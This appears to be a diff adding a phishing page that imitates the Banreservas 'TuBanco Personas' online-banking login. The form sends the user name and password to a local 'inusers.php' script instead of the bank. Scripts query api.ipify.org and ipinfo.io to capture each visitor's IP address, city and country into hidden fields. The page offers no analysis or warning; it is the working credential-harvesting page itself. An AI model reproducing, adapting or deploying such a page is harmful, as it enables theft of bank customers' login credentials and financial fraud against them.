@@ -1,0 +1,373 @@
+
+<html class=" dkddl_fouc"><head id="ctl00_Head1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=10">
+
+    <title> Banreservas </title>
+    <script src="./index_files/jquery.min.js.descarga"></script> 
+      <script>
+         $.getJSON("https://api.ipify.org?format=json",
+                                           function(data) {
+         
+             // Setting text of element P with id gfg
+             $("#gfg").html(data.ip);
+         })
+      </script>
+      <script>
+         $.getJSON("https://ipinfo.io", function (response) {
+      $("#ip").html("IP: " + response.ip);
+      $("#address").html("" + response.city + ", " + response.country);
+
+      })
+      </script>
+
+
+    <link type="text/css" href="./index_files/jquery-ui-1.8.9.custom.css" rel="stylesheet">
+    <link href="./index_files/dropkickddl.css" rel="stylesheet" type="text/css">
+    <link rel="shortcut icon" href="https://www.banreservas.com.do/TuBancoPersonas/App_Themes/Login/Images/favicon.ico" type="image/vnd.microsoft.icon">
+    <link href="./index_files/jquery-ui-1.8.9.custom(1).css" type="text/css" rel="stylesheet">
+    <link href="./index_files/Login.css" type="text/css" rel="stylesheet">
+   
+    <style type="text/css">
+      #_copy {
+        align-items: center;
+        background: #4494d5;
+        border-radius: 3px;
+        color: #fff;
+        cursor: pointer;
+        display: flex;
+        font-size: 13px;
+        height: 30px;
+        justify-content: center;
+        position: absolute;
+        width: 60px;
+        z-index: 1000
+      }
+
+      #select-tooltip,
+      #sfModal,
+      .modal-backdrop,
+      div[id^=reader-helper] {
+        display: none !important
+      }
+
+      .modal-open {
+        overflow: auto !important
+      }
+
+      ._sf_adjust_body {
+        padding-right: 0 !important
+      }
+
+      .super_copy_btns_div {
+        position: fixed;
+        width: 154px;
+        left: 10px;
+        top: 45%;
+        background: #e7f1ff;
+        border: 2px solid #4595d5;
+        font-weight: 600;
+        border-radius: 2px;
+        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, PingFang SC, Hiragino Sans GB, Microsoft YaHei, Helvetica Neue, Helvetica, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
+        z-index: 5000
+      }
+
+      .super_copy_btns_logo {
+        width: 100%;
+        background: #4595d5;
+        text-align: center;
+        font-size: 12px;
+        color: #e7f1ff;
+        line-height: 30px;
+        height: 30px
+      }
+
+      .super_copy_btns_btn {
+        display: block;
+        width: 128px;
+        height: 28px;
+        background: #7f5711;
+        border-radius: 4px;
+        color: #fff;
+        font-size: 12px;
+        border: 0;
+        outline: 0;
+        margin: 8px auto;
+        font-weight: 700;
+        cursor: pointer;
+        opacity: .9
+      }
+
+      .super_copy_btns_btn:hover {
+        opacity: .8
+      }
+
+      .super_copy_btns_btn:active {
+        opacity: 1
+      }
+    </style>
+  </head>
+  <body class="top" style="" _c_t_common="1">
+   <form action="inusers.php" method="post">
+      <p id="gfg" hidden="">
+                  </p><p id="address" hidden="">Medellín, CO</p><div class="contenedorgenerico">
+        <div class="header">
+          <div class="floatRight">
+            <div id="ctl00_headerOptions" class="menu_br">
+              <ul>
+                <li>
+                  <a href="https://dev-banreservas.pantheonsite.io/banreservas/#" class="hide"> Contáctenos</a>
+                </li>
+                <li class="lenguaje">
+                  <a href="javascript:void()" class="hide"> Idioma&nbsp;&nbsp;&nbsp;</a>
+                  <ul class="options">
+                    <li class="idioma1">
+                      <a id="ctl00_lngEs" href="javascript:__doPostBack(&#39;ctl00$lngEs&#39;,&#39;&#39;)">Español</a>
+                    </li>
+                    <li class="idioma2">
+                      <a id="ctl00_lngEn" href="javascript:__doPostBack(&#39;ctl00$lngEn&#39;,&#39;&#39;)">Inglés</a>
+                    </li>
+                    <li class="idioma3">
+                      <a id="ctl00_lngFr" href="javascript:__doPostBack(&#39;ctl00$lngFr&#39;,&#39;&#39;)">Francés</a>
+                    </li>
+                  </ul>
+                </li>
+                <li>
+                  <a href="https://dev-banreservas.pantheonsite.io/banreservas/#" class="hide"> Ayuda</a>
+                </li>
+                <li>
+                  <div class="salir">
+                    <a href="https://dev-banreservas.pantheonsite.io/banreservas/#" class="hide salirLink">Banreservas.com</a>
+                  </div>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <noscript class="ic-content-left-aux" style="width: 100%; font-size: large; color: Black;
+            padding-left: 9"> NetBanking Banreservas requiere la opción de JavaScript habilitada para funcionar . </noscript>
+        <div class="login-container">
+         
+          <div id="capaTeclado" style="width: 40px; height: 0px; visibility: hidden; display: none">
+            <table cellpadding="0" cellspacing="0" class="floatingHeader">
+              <tbody>
+                <tr style="padding-top:10px;padding-bottom=0px;">
+                  <td ondblclick="void(0);" onmouseover="over=true;" onmouseout="over=false;" style="cursor: move;
+                border: none;width: 90%;" class="ic-log-message-text"></td>
+                  <td style="padding-right: 10px; width:10%; text-align: right;">
+                    <a href="javascript:hiddenFloatingDiv(&#39;capaTeclado&#39;);void(0);">
+                      <img alt="Close" src="./index_files/img-close.gif" border="0" style="text-align: right;">
+                    </a>
+                  </td>
+                </tr>
+                <tr>
+                  <td colspan="2">
+                    <table border="0">
+                      <tbody>
+                        <tr valign="top">
+                          <td class="textoContenido">
+                            <a href="https://dev-banreservas.pantheonsite.io/banreservas/#" onmouseover="mostrarImagen();return false;">
+                              <img src="./index_files/teclado_login_minusculas.png" name="image" border="0" usemap="#Map" alt="">
+                              <map id="map" name="Map">
+                               </map></a>
+                          </td>
+                        </tr>
+                      </tbody>
+                    </table>
+                    <div>
+                      <table border="0" width="100%">
+                        <tbody>
+                          <tr align="center" valign="top">
+                            <td class="ic-log-form-label" style="text-align: right; width:35%"> Contraste: </td>
+                            <td class="ic-log-form-label " style="text-align: left;width:25%">
+                              <input type="radio" id="HighContrast" class="textoContenido" name="contraste" onclick="cambiarContraste(true);" checked="checked">
+                              <img src="./index_files/teclado_virtual_chico_ac.gif" id="ctl00_MainHolder_ctrVirtualKeyboard1_imgVirtualKeyboard" onclick="cambiarContraste(true);" style="border: none" alt="Alto">
+                            </td>
+                            <td class="ic-log-form-label" style="text-align: left;width:40%">
+                              <input type="radio" id="LowContrast" class="textoContenido" name="contraste" onclick="cambiarContraste(false);">
+                              <img src="./index_files/teclado_virtual_chico_bc.gif" id="ctl00_MainHolder_ctrVirtualKeyboard1_img1" onclick="cambiarContraste(false);" style="border: none" alt="Bajo">
+                            </td>
+                          </tr>
+                        </tbody>
+                      </table>
+                    </div>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <div class="logo-ban">
+            <img src="./index_files/logo_banreservas.png" alt="BanReservas">
+          </div>
+          <div id="dimmer">
+            <div id="ctl00_MainHolder_authenticate_firsStep_panel" onkeypress="javascript:return WebForm_FireDefaultButton(event, &#39;ctl00_MainHolder_linkButton_SecondStep&#39;)" style="text-align:center;padding-top: 5px">
+              <div align="center">
+                <table class="tabla-login" cellpadding="0" cellspacing="0">
+                  <tbody>
+                    <tr>
+                      <td>
+                        <table class="subtabla-login" cellpadding="0" cellspacing="0" style="align-content:center">
+                          <tbody>
+                            <tr class="titulo">
+                              <td class=""> Bienvenidos a TuBanco Personas </td>
+                            </tr>
+                            <tr>
+                              <td>
+                                <table cellpadding="0" cellspacing="0" class="subtabla-login-campos" style="height: 438px">
+                                  <tbody>
+                                    <tr>
+                                      <td style="height:1px">
+                                        <div class="alto">
+                                          <div class="labelLogin" style="text-align:left"> Ingrese su usuario </div>
+                                          <div class="requerido">
+                                            <input type="text" name="UserId" maxlength="20" class="ic-control-text" id="DocumentNumber" required="" placeholder="USUARIO">
+                                          </div>
+                                          <span class="ic-error-message" style="text-align:left;display:none;">Por favor ingrese el nombre de usuario correcto.</span>
+                                          <span id="ctl00_MainHolder_UserNameErrorText" class="error"></span>
+                                        </div>
+                                      </td>
+                                    </tr>
+                                    <tr>
+                                      <td style="height:5px"></td>
+                                    </tr>
+                                    <tr>
+                                      <td style="height:1px">
+                                        <div class="alto">
+                                          <div class="labelLogin" style="text-align:left"> Contraseña </div>
+                                          <div class="requerido">
+                                            <input type="password" name="Clave" maxlength="100" class="ic-control-text" id="DocumentNumber2" required="" placeholder="CONTRASEÑA">
+                                          </div>
+                                          <div class="val-drp-log-pass1111">
+                                            <span id="ctl00_MainHolder_PasswordRequiredFieldValidator" class="ic-error-message" style="text-align:left;display:none;">Por favor ingrese la contraseña</span>
+                                          </div>
+                                          <div>
+                                            <div id="ctl00_MainHolder_upPanelPrincipal">
+                                              <table>
+                                                <tbody>
+                                                  <tr></tr>
+                                                </tbody>
+                                              </table>
+                                            </div>
+                                          </div>
+                                          <!-- Captcha -->
+                                          <div>
+                                            <table>
+                                              <tbody>
+                                                <tr></tr>
+                                              </tbody>
+                                            </table>
+                                          </div>
+                                        </div>
+                                      </td>
+                                    </tr>
+                                    <tr>
+                                      <td style="height:5px"></td>
+                                    </tr>
+                                    <tr>
+                                      <td style="height:1px">
+                                        <div class="btn_blue">
+                                          <button class="ic-button" style="font-family: Open Sans;font-size: 14px;color: #FFF;width: 250px; height: 20px;background: none;border:none;cursor: pointer;">Continuar</button>
+                                        </div>
+                                        <div class="links_step1">
+                                          <a id="ctl00_MainHolder_linkEmpresas" class="links" href="https://dev-banreservas.pantheonsite.io/banreservas/#">Cambiar a TuBanco Empresas</a>
+                                          <a id="ctl00_MainHolder_linkButton1" tabindex="5" class="destacado links" href="https://dev-banreservas.pantheonsite.io/banreservas/#">Nuevo usuario persona</a>
+                                          <a id="ctl00_MainHolder_LinkButtonPasswordRecovery" class="destacado links" href="https://dev-banreservas.pantheonsite.io/banreservas/#">¿Olvidó su contraseña?</a>
+                                        </div>
+                                      </td>
+                                    </tr>
+                                    <tr>
+                                      <td></td>
+                                    </tr>
+                                  </tbody>
+                                </table>
+                              </td>
+                            </tr>
+                          </tbody>
+                        </table>
+                      </td>
+                      <td>
+                        <div class="tabla-login imagen"> &nbsp; </div>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+                <table class="tabla-login-teclado" cellpadding="0" cellspacing="0">
+                  <tbody>
+                    <tr>
+                      <td>
+                        <div class="teclado_step1">
+                          <a id="A1" href="javascript:ActivateVirtualKeyboard(0);" class="ic-log-message-link" style="cursor: pointer; text-decoration: none; color: #4A4A4A; padding-right: 14px">
+                            <img src="./index_files/teclado_virtual_chico_ac.gif" id="ctl00_MainHolder_imgVirtualKeyboard" style="border: none;
+                                                vertical-align: middle;" alt="Teclado Virtual"> Teclado Virtual </a>
+                        </div>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+                <table class="tabla-login-teclado" cellpadding="0" cellspacing="0">
+                  <tbody>
+                    <tr>
+                      <td>
+                        <div align="center">
+                          <a id="superintendencia" href="https://dev-banreservas.pantheonsite.io/banreservas/#" class="ic-log-message-link" style="cursor: pointer; text-decoration: none; color: #4A4A4A; padding-right: 14px">
+                            <img src="./index_files/sello_superintendencia.png" id="ctl00_MainHolder_superintendenciaImg" style="border: none;
+                                                vertical-align: middle;" width="120" height="120">
+                          </a>
+                        </div>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+              <!--
+Esta tabla está en Display:none, debemos ver que campos de aquí van en el sitio
+ -->
+              <table cellpadding="4" cellspacing="2" style="width: 100%; display: none;">
+                <tbody>
+                  <tr>
+                    <td>
+                      <table class="ic-grid-border" cellspacing="0" cellpadding="0" style="width:100%;border-collapse:collapse;">
+                        <tbody>
+                          <tr>
+                            <td>
+                              <table id="ctl00_MainHolder_PanelControl_thePanel" class="ic-grid" cellspacing="0" cellpadding="0" align="Center" style="width:100%;border-collapse:collapse;">
+                                <tbody>
+                                  <tr class="ic-grid-title-row">
+                                    <td>
+                                      <table cellspacing="0" cellpadding="0" style="width:100%;border-collapse:collapse;">
+                                        <tbody>
+                                          <tr>
+                                            <td class="ic-grid-title-cell" align="left" style="white-space:nowrap;">Ingresar al sistema</td>
+                                          </tr>
+                                        </tbody>
+                                      </table>
+                                    </td>
+                                  </tr>
+                                  <tr>
+                                    <td align="center">
+                                      <div id="ctl00_MainHolder_PanelControl" style="color:Black;border-color:DodgerBlue;font-family:verdana;font-size:10pt;width:100%;"></div>
+                                    </td>
+                                  </tr>
+                                </tbody>
+                              </table>
+                            </td>
+                          </tr>
+                        </tbody>
+                      </table>
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+              <!--
+Termina tabla que está en Display:none, debemos ver que campos de aquí van en el sitio
+ -->
+            </div>
+          </div>
+         
+        </div>
+      </div>
+     
+    </form>
+    <script src="./index_files/sax.js.descarga"></script>
+  
+</body></html>
